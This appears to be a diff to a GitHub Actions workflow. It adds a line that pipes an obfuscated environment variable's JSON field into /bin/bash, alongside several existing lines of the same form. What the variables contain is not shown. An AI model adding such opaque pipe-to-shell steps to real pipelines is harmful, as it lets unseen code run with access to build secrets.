@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$sc7" | jq -r .pcm199 | /bin/bash
           echo $u95 | jq -r .atl03 | /bin/bash
           echo $zpfan799 | jq -r .ybk87 | /bin/bash
+          echo $tuaul177 | jq -r .agoa7 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
